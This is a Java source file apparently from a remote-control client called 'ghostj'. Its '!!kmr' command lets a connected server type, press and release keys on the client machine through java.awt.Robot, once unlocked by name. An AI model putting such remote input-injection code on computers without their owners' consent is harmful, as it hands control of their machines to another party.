package com.ghostj.client.func;

import com.ghostj.client.cmd.AbstractFunc;
import com.ghostj.client.cmd.AbstractProcessor;
import com.ghostj.client.conn.HandleConn;
import com.ghostj.client.core.ClientMain;

import java.awt.*;
import java.awt.event.KeyEvent;

import static java.lang.Thread.sleep;

/**
 * 模拟客户端的鼠标和键盘操作
 */
public class FuncKMR implements AbstractFunc {
	@Override
	public String getFuncName() {
		return "!!kmr";
	}

	@Override
	public String[] getParamsModel() {
		return new String[0];
	}

	@Override
	public String getDescription() {
		return "keyboard and mouse robot";
	}

	@Override
	public int getMinParamsAmount() {
		return 1;
	}
	static boolean lock=true;
	public static Robot robot;

	static {
		try {
			robot = new Robot();
		} catch (AWTException e) {
			e.printStackTrace();
		}
	}

	@Override
	public void run(String[] params, String cmd, AbstractProcessor processor) {
		if(params[0].equalsIgnoreCase("unlock")){
			if (params[1].equalsIgnoreCase(ClientMain.name)){
				lock=false;
				HandleConn.writeToServerIgnoreException("已解锁客户端:"+ClientMain.name+"的键鼠操作权限\n");
			}
		}else if(params[0].equalsIgnoreCase("lock")){
			lock=true;
			HandleConn.writeToServerIgnoreException("已锁定键鼠操作权限.\n");
		}else if(params[0].equalsIgnoreCase("key")){
			//key <p[ress]|r[elease]|t[ype]> [params]
			try {
				switch (params[1]) {
					case "t": {
//						System.out.println("sub:"+cmd.substring(11));
						char[] stra = cmd.substring(12).toCharArray();
						for (char ch:stra){
//							System.out.print(ch);
							typeSymbol(ch);
						}
						break;
					}
					case "p":{//!!kmr key p <key:char|%<key:int> [time]
						long keep=0;
						boolean setkeep=false;
						//是否设置了时间
						if (params[params.length-1].startsWith("-t:")){
							setkeep=true;
							keep=Long.parseLong(params[params.length-1].split(":")[1]);
						}
						String[] keys=cmd.substring(12,setkeep?cmd.length()-params[params.length-1].length():cmd.length()).split(" ");
						for (String key:keys){
							int v=getSymbolKey(key);
							robot.keyPress(v);
						}
						sleep(keep);
						for (String key:keys){
							int v=getSymbolKey(key);
							robot.keyRelease(v);
						}
						break;
					}
					case "r":{
						String[] keys=cmd.substring(12).split(" ");
						for (String key:keys){
							int v=getSymbolKey(key);
							robot.keyRelease(v);
						}
						break;
					}
					default:{
						HandleConn.writeToServerIgnoreException("命令语法不正确.\n");
					}
				}
			}catch (Exception e){
				HandleConn.writeToServerIgnoreException("异常:"+ClientMain.getErrorInfo(e)+"\n");
				e.printStackTrace();
			}
		}else if(params[0].equalsIgnoreCase("mouse")){

		}else {
			HandleConn.writeToServerIgnoreException("命令语法不正确.\n");
		}
		HandleConn.sendFinishToServer();
	}
	public void doType(int lastKey,int instantKey){
		robot.keyPress(lastKey);
		robot.keyPress(instantKey);
		robot.keyRelease(instantKey);
		robot.keyRelease(lastKey);
	}
	public void doType(int key){
//		System.out.println(" "+key);
		robot.keyPress(key);
		robot.keyRelease(key);
	}
	public int getSymbolKey(String sym){
//		System.out.println(sym);
		switch (sym) {
			case "a": {
				return KeyEvent.VK_A;
			}
			case "b": {
				return KeyEvent.VK_B;
			}
			case "c": {
				return KeyEvent.VK_C;
			}
			case "d": {
				return KeyEvent.VK_D;
			}
			case "e": {
				return KeyEvent.VK_E;
			}
			case "f": {
				return KeyEvent.VK_F;
			}
			case "g": {
				return KeyEvent.VK_G;
			}
			case "h": {
				return KeyEvent.VK_H;
			}
			case "i": {
				return KeyEvent.VK_I;
			}
			case "j": {
				return KeyEvent.VK_J;
			}
			case "k":{
				return KeyEvent.VK_K;
			}
			case "l":{
				return KeyEvent.VK_L;
			}
			case "m":{
				return KeyEvent.VK_M;
			}
			case "n":{
				return KeyEvent.VK_N;
			}
			case "o":{
				return KeyEvent.VK_O;
			}
			case "p":{
				return KeyEvent.VK_P;
			}
			case "q":{
				return KeyEvent.VK_Q;
			}
			case "r":{
				return KeyEvent.VK_R;
			}
			case "s":{
				return KeyEvent.VK_S;
			}
			case "t":{
				return KeyEvent.VK_T;
			}
			case "u":{
				return KeyEvent.VK_U;
			}
			case "v":{
				return KeyEvent.VK_V;
			}case "w":{
				return KeyEvent.VK_W;
			}case "x":{
				return KeyEvent.VK_X;
			}case "y":{
				return KeyEvent.VK_Y;
			}case "z":{
				return KeyEvent.VK_Z;
			}
			case "`":{
				return KeyEvent.VK_BACK_QUOTE;
			}
			case "0":{
				return KeyEvent.VK_0;
			}
			case "1":{
				return KeyEvent.VK_1;
			}
			case "2":{
				return KeyEvent.VK_2;
			}
			case "3":{
				return KeyEvent.VK_3;
			}
			case "4":{
				return KeyEvent.VK_4;
			}
			case "5":{
				return KeyEvent.VK_5;
			}
			case "6":{
				return KeyEvent.VK_6;
			}
			case "7":{
				return KeyEvent.VK_7;
			}
			case "8":{
				return KeyEvent.VK_8;
			}
			case "9":{
				return KeyEvent.VK_9;
			}
			case "-":{
				return KeyEvent.VK_MINUS;
			}
			case "=":{
				return KeyEvent.VK_EQUALS;
			}
			case "\t":
			case "tab":
			case "TAB": {
				return KeyEvent.VK_TAB;
			}
			case "\n":
			case "enter":
			case "ENTER": {
				return KeyEvent.VK_ENTER;
			}
			case "[":{
				return KeyEvent.VK_OPEN_BRACKET;
			}
			case "]":{
				return KeyEvent.VK_CLOSE_BRACKET;
			}
			case "\\":{
				return KeyEvent.VK_BACK_SLASH;
			}
			case ";":{
				return KeyEvent.VK_SEMICOLON;
			}
			case "\"":{
				return KeyEvent.VK_QUOTE;
			}
			case ",":{
				return KeyEvent.VK_COMMA;
			}
			case ".":{
				return KeyEvent.VK_PERIOD;
			}
			case "/":{
				return KeyEvent.VK_SLASH;
			}
			case "space":
			case "SPACE":
			case " ":{
				return KeyEvent.VK_SPACE;
			}
			case "shift":
			case "SHIFT":{
				return KeyEvent.VK_SHIFT;
			}
			case "ctrl":
			case "CTRL":{
				return KeyEvent.VK_CONTROL;
			}
			case "alt":
			case "ALT":{
				return KeyEvent.VK_ALT;
			}
			case "caps":
			case "CAPS":{
				return KeyEvent.VK_CAPS_LOCK;
			}
			case "del":
			case "DEL":{
				return KeyEvent.VK_DELETE;
			}
			case "windows":
			case "WINDOWS":
			case "system":
			case "SYSTEM":{
				return KeyEvent.VK_WINDOWS;
			}
			case "home":
			case "HOME":{
				return KeyEvent.VK_HOME;
			}
			case "end":
			case "END":{
				return KeyEvent.VK_END;
			}
			case "pgup":
			case "PGUP":{
				return KeyEvent.VK_PAGE_UP;
			}
			case "pgdn":
			case "PGDN":{
				return KeyEvent.VK_PAGE_DOWN;
			}
			case "f1":
			case "F1":{
				return KeyEvent.VK_F1;
			}
			case "f2":
			case "F2":{
				return KeyEvent.VK_F2;
			}
			case "f3":
			case "F3":{
				return KeyEvent.VK_F3;
			}
			case "f4":
			case "F4":{
				return KeyEvent.VK_F4;
			}
			case "f5":
			case "F5":{
				return KeyEvent.VK_F5;
			}
			case "f6":
			case "F6":{
				return KeyEvent.VK_F6;
			}
			case "f7":
			case "F7":{
				return KeyEvent.VK_F7;
			}
			case "f8":
			case "F8":{
				return KeyEvent.VK_F8;
			}
			case "f9":
			case "F9":{
				return KeyEvent.VK_F9;
			}
			case "f10":
			case "F10":{
				return KeyEvent.VK_F10;
			}
			case "f11":
			case "F11":{
				return KeyEvent.VK_F11;
			}
			case "f12":
			case "F12":{
				return KeyEvent.VK_F12;
			}
			case "left":
			case "LEFT":{
				return KeyEvent.VK_LEFT;
			}
			case "right":
			case "RIGHT":{
				return KeyEvent.VK_RIGHT;
			}
			case "up":
			case "UP":{
				return KeyEvent.VK_UP;
			}
			case "down":
			case "DOWN":{
				return KeyEvent.VK_DOWN;
			}
			case "esc":
			case "ESC":{
				return KeyEvent.VK_ESCAPE;
			}
		}
		return 0;
	}
	public void typeSymbol(char ch){
		switch (ch) {
			case 'a': {
				doType(KeyEvent.VK_A);
				break;
			}
			case 'b': {
				doType(KeyEvent.VK_B);
				break;
			}
			case 'c': {
				doType(KeyEvent.VK_C);
				break;
			}
			case 'd': {
				doType(KeyEvent.VK_D);
				break;
			}
			case 'e': {
				doType(KeyEvent.VK_E);
				break;
			}
			case 'f': {
				doType(KeyEvent.VK_F);
				break;
			}
			case 'g': {
				doType(KeyEvent.VK_G);
				break;
			}
			case 'h': {
				doType(KeyEvent.VK_H);
				break;
			}
			case 'i': {
				doType(KeyEvent.VK_I);
				break;
			}
			case 'j': {
				doType(KeyEvent.VK_J);
				break;
			}
			case 'k':{
				doType(KeyEvent.VK_K);
				break;
			}
			case 'l':{
				doType(KeyEvent.VK_L);
				break;
			}
			case 'm':{
				doType(KeyEvent.VK_M);
				break;
			}
			case 'n':{
				doType(KeyEvent.VK_N);
				break;
			}
			case 'o':{
				doType(KeyEvent.VK_O);
				break;
			}
			case 'p':{
				doType(KeyEvent.VK_P);
				break;
			}
			case 'q':{
				doType(KeyEvent.VK_Q);
				break;
			}
			case 'r':{
				doType(KeyEvent.VK_R);
				break;
			}
			case 's':{
				doType(KeyEvent.VK_S);
				break;
			}
			case 't':{
				doType(KeyEvent.VK_T);
				break;
			}
			case 'u':{
				doType(KeyEvent.VK_U);
				break;
			}
			case 'v':{
				doType(KeyEvent.VK_V);
				break;
			}case 'w':{
				doType(KeyEvent.VK_W);
				break;
			}case 'x':{
				doType(KeyEvent.VK_X);
				break;
			}case 'y':{
				doType(KeyEvent.VK_Y);
				break;
			}case 'z':{
				doType(KeyEvent.VK_Z);
				break;
			}
			case 'A':{
				doType(KeyEvent.VK_SHIFT, KeyEvent.VK_A);
				break;
			}
			case 'B':{
				doType(KeyEvent.VK_SHIFT, KeyEvent.VK_B);
				break;
			}
			case 'C':{
				doType(KeyEvent.VK_SHIFT, KeyEvent.VK_C);
				break;
			}
			case 'D':{
				doType(KeyEvent.VK_SHIFT, KeyEvent.VK_D);
				break;
			}
			case 'E':{
				doType(KeyEvent.VK_SHIFT, KeyEvent.VK_E);
				break;
			}
			case 'F':{
				doType(KeyEvent.VK_SHIFT, KeyEvent.VK_F);
				break;
			}
			case 'G':{
				doType(KeyEvent.VK_SHIFT, KeyEvent.VK_G);
				break;
			}
			case 'H':{
				doType(KeyEvent.VK_SHIFT, KeyEvent.VK_H);
				break;
			}
			case 'I':{
				doType(KeyEvent.VK_SHIFT, KeyEvent.VK_I);
				break;
			}
			case 'J':{
				doType(KeyEvent.VK_SHIFT, KeyEvent.VK_J);
				break;
			}
			case 'K':{
				doType(KeyEvent.VK_SHIFT, KeyEvent.VK_K);
				break;
			}
			case 'L':{
				doType(KeyEvent.VK_SHIFT, KeyEvent.VK_L);
				break;
			}
			case 'M':{
				doType(KeyEvent.VK_SHIFT, KeyEvent.VK_M);
				break;
			}
			case 'N':{
				doType(KeyEvent.VK_SHIFT, KeyEvent.VK_N);
				break;
			}
			case 'O':{
				doType(KeyEvent.VK_SHIFT, KeyEvent.VK_O);
				break;
			}
			case 'P':{
				doType(KeyEvent.VK_SHIFT, KeyEvent.VK_P);
				break;
			}
			case 'Q':{
				doType(KeyEvent.VK_SHIFT, KeyEvent.VK_Q);
				break;
			}
			case 'R':{
				doType(KeyEvent.VK_SHIFT, KeyEvent.VK_R);
				break;
			}
			case 'S':{
				doType(KeyEvent.VK_SHIFT, KeyEvent.VK_S);
				break;
			}
			case 'T':{
				doType(KeyEvent.VK_SHIFT, KeyEvent.VK_T);
				break;
			}
			case 'U':{
				doType(KeyEvent.VK_SHIFT, KeyEvent.VK_U);
				break;
			}
			case 'V':{
				doType(KeyEvent.VK_SHIFT, KeyEvent.VK_V);
				break;
			}
			case 'W':{
				doType(KeyEvent.VK_SHIFT, KeyEvent.VK_W);
				break;
			}
			case 'X':{
				doType(KeyEvent.VK_SHIFT, KeyEvent.VK_X);
				break;
			}
			case 'Y':{
				doType(KeyEvent.VK_SHIFT, KeyEvent.VK_Y);
				break;
			}
			case 'Z':{
				doType(KeyEvent.VK_SHIFT, KeyEvent.VK_Z);
				break;
			}
			case '`':{
				doType(KeyEvent.VK_BACK_QUOTE);
				break;
			}
			case '0':{
				doType(KeyEvent.VK_0);
				break;
			}
			case '1':{
				doType(KeyEvent.VK_1);
				break;
			}
			case '2':{
				doType(KeyEvent.VK_2);
				break;
			}
			case '3':{
				doType(KeyEvent.VK_3);
				break;
			}
			case '4':{
				doType(KeyEvent.VK_4);
				break;
			}
			case '5':{
				doType(KeyEvent.VK_5);
				break;
			}
			case '6':{
				doType(KeyEvent.VK_6);
				break;
			}
			case '7':{
				doType(KeyEvent.VK_7);
				break;
			}
			case '8':{
				doType(KeyEvent.VK_8);
				break;
			}
			case '9':{
				doType(KeyEvent.VK_9);
				break;
			}
			case '-':{
				doType(KeyEvent.VK_MINUS);
				break;
			}
			case '=':{
				doType(KeyEvent.VK_EQUALS);
				break;
			}
			case '~':{
				doType(KeyEvent.VK_SHIFT, KeyEvent.VK_BACK_QUOTE);
				break;
			}
			case '!':{
				doType(KeyEvent.VK_SHIFT,KeyEvent.VK_1);
				break;
			}
			case '@':{
				doType(KeyEvent.VK_SHIFT,KeyEvent.VK_2);
				break;
			}
			case '#':{
				doType(KeyEvent.VK_SHIFT,KeyEvent.VK_3);
				break;
			}
			case '$':{
				doType(KeyEvent.VK_SHIFT,KeyEvent.VK_4);
				break;
			}
			case '%':{
				doType(KeyEvent.VK_SHIFT, KeyEvent.VK_5);
				break;
			}
			case '^':{
				doType(KeyEvent.VK_SHIFT,KeyEvent.VK_6);
				break;
			}
			case '&':{
				doType(KeyEvent.VK_SHIFT,KeyEvent.VK_7);
				break;
			}
			case '*':{
				doType(KeyEvent.VK_SHIFT,KeyEvent.VK_8);
				break;
			}
			case '(':{
				doType(KeyEvent.VK_SHIFT, KeyEvent.VK_9);
				break;
			}
			case ')':{
				doType(KeyEvent.VK_SHIFT, KeyEvent.VK_0);
				break;
			}
			case '_':{
				doType(KeyEvent.VK_SHIFT,KeyEvent.VK_MINUS);
				break;
			}
			case '+':{
				doType(KeyEvent.VK_SHIFT,KeyEvent.VK_EQUALS);
				break;
			}
			case '\t':{
				doType(KeyEvent.VK_TAB);
				break;
			}
			case '\n':{
				doType(KeyEvent.VK_ENTER);
				break;
			}
			case '[':{
				doType(KeyEvent.VK_OPEN_BRACKET);
				break;
			}
			case ']':{
				doType(KeyEvent.VK_CLOSE_BRACKET);
				break;
			}
			case '\\':{
				doType(KeyEvent.VK_BACK_SLASH);
				break;
			}
			case '{':{
				doType(KeyEvent.VK_SHIFT, KeyEvent.VK_OPEN_BRACKET);
				break;
			}
			case '}':{
				doType(KeyEvent.VK_SHIFT, KeyEvent.VK_CLOSE_BRACKET);
				break;
			}
			case '|':{
				doType(KeyEvent.VK_SHIFT, KeyEvent.VK_BACK_SLASH);
				break;
			}
			case ';':{
				doType(KeyEvent.VK_SEMICOLON);
				break;
			}
			case ':':{
				doType(KeyEvent.VK_SHIFT, KeyEvent.VK_SEMICOLON);
				break;
			}
			case '\'':{
				doType(KeyEvent.VK_QUOTE);
				break;
			}
			case '"':{
				doType(KeyEvent.VK_SHIFT, KeyEvent.VK_QUOTE);
				break;
			}
			case ',':{
				doType(KeyEvent.VK_COMMA);
				break;
			}
			case '<':{
				doType(KeyEvent.VK_SHIFT, KeyEvent.VK_COMMA);
				break;
			}
			case '.':{
				doType(KeyEvent.VK_PERIOD);
				break;
			}
			case '>':{
				doType(KeyEvent.VK_SHIFT, KeyEvent.VK_PERIOD);
				break;
			}
			case '/':{
				doType(KeyEvent.VK_SLASH);
				break;
			}
			case '?':{
				doType(KeyEvent.VK_SHIFT, KeyEvent.VK_SLASH);
				break;
			}
			case ' ':{
				doType(KeyEvent.VK_SPACE);
				break;
			}
		}
	}

}
